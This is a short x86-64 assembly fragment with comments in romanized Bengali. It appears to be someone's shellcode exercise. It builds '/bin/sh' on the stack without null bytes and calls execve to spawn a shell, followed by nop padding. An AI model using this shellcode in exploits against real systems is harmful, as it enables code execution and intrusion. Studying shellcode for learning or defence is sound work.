 thik ache
	movl $0xff68732f, %eax # half string
	shlq $40, %rax
	shrq $8, %rax
	orq $0x6e69622f, %rax
	pushq %rax

	# /bin/echo
	# movl $0xff68732f, %eax # half string
	# shlq $40, %rax
	# shrq $8, %rax
	# orq $0x6e69622f, %rax
	# pushq %rax

	# print check
	# movq %rsp, %rsi
	# movq $1, %rax
	# movq $1, %rdi
	# movq $8, %rdx
	# syscall


	# filename argument: rdi
	movq %rsp, %rdi
	 
	# argv argument: rsi
	xorq %rax, %rax
	pushq %rax
	pushq %rdi
	movq %rsp, %rsi

	# envp argument: rdx
	xorq %rdx, %rdx

	# rax e 0x3b rakhte hobe code e 0 na kore
	movl $0xffffff3b, %eax  # sys_execve
	shlq $56, %rax
	shrq $56, %rax
	syscall
	movq $0xaabbccdd, %rbx
	nop 			# 0x90 ?
	nop
	nop 			
	movq $0xaabbccdd, %rbx


	# exit
	# movq $60, %rax
	# syscall
